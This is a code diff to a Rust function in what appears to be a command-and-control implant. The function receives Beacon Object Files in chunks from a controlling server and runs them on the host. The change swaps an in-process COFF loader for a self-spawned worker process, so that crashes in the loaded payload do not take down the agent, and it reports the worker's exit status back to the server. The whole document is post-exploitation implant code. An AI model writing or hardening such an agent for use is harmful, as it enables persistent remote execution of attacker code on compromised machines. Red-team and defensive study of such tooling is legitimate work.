@@ -1,12 +1,9 @@
-use coffeeldr::CoffeeLdr;
 use serde::Deserialize;
 use serde_json::{Value, json};
 use base64::engine::general_purpose;
 use base64::Engine;
-use std::io::{Cursor, Read};
+use std::io::Write;
 const CHUNK_SIZE: usize = 4096;
-use std::path::PathBuf;
-
 
 #[derive(Deserialize)]
 struct UploadParams {
@@ -48,72 +45,41 @@ pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
         chunk_num += 1;
     }
 
+    // 3. Spawn self as isolated worker process so a crash/exit in the
+    //    BOF doesn't take down the agent.
+    let exe = std::env::current_exe()?;
+    let worker_input = json!({
+        "file_bytes": general_purpose::STANDARD.encode(&file_bytes),
+        "parameters": params.parameters
+    })
+    .to_string();
 
-    // 3. Load & run COFF from buffer, wrapped in catch_unwind so a panic
-    //    from the loaded BOF doesn't unwind through and kill the agent.
-    use coffeeldr::BeaconPack;
+    let mut child = std::process::Command::new(&exe)
+        .arg("--worker-bof")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()?;
 
-    let params_str = params.parameters.trim().to_string();
+    if let Some(mut stdin) = child.stdin.take() {
+        stdin.write_all(worker_input.as_bytes())?;
+    }
 
-    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-        let mut output = String::new();
+    let child_output = child.wait_with_output()?;
 
-        match CoffeeLdr::new(file_bytes.as_slice()) {
-            Ok(mut ldr) => {
-                output.push_str("COFF loaded!\n");
-
-                if params_str.is_empty() {
-                    match ldr.run("go", None, None) {
-                        Ok(res) => output.push_str(&res),
-                        Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
-                    }
-                } else {
-                    let mut pack = BeaconPack::default();
-
-                    for arg in params_str.split_whitespace() {
-                        if let Err(e) = pack.addstr(arg) {
-                            output.push_str(&format!("Arg error ({}): {}\n", arg, e));
-                        }
-                    }
-
-                    match pack.get_buffer_hex() {
-                        Ok(buf) => {
-                            let ptr = buf.as_ptr() as *mut u8;
-                            let len = buf.len();
-
-                            match ldr.run("go", Some(ptr), Some(len)) {
-                                Ok(res) => output.push_str(&res),
-                                Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
-                            }
-
-                            std::mem::forget(buf); // ensure memory lives during run
-                        }
-                        Err(e) => {
-                            output.push_str(&format!("Pack error: {}\n", e));
-                        }
-                    }
-                }
-            }
-            Err(e) => output.push_str(&format!("Load error: {:?}\n", e)),
-        }
-
-        output
-    }));
-
-    let output = match result {
-        Ok(out) => out,
-        Err(panic_info) => {
-            if let Some(s) = panic_info.downcast_ref::<&str>() {
-                format!("BOF execution panicked: {}", s)
-            } else if let Some(s) = panic_info.downcast_ref::<String>() {
-                format!("BOF execution panicked: {}", s)
-            } else {
-                "BOF execution panicked (unknown cause)".to_string()
-            }
-        }
+    let (output, status) = if child_output.status.success() {
+        (String::from_utf8_lossy(&child_output.stdout).to_string(), "success")
+    } else {
+        let stderr = String::from_utf8_lossy(&child_output.stderr);
+        let stdout = String::from_utf8_lossy(&child_output.stdout);
+        let msg = format!(
+            "BOF worker exited with code {:?}{}{}",
+            child_output.status.code(),
+            if !stdout.is_empty() { format!("\nstdout: {}", stdout) } else { String::new() },
+            if !stderr.is_empty() { format!("\nstderr: {}", stderr) } else { String::new() }
+        );
+        (msg, "error")
     };
-
-
 
     // 4. Send final response
     let done = json!({
@@ -122,7 +88,7 @@ pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
             "task_id": id,
             "user_output": output,
             "agent_file_id": file_id,
-            "status": "success"
+            "status": status
         }]
     })
     .to_string();
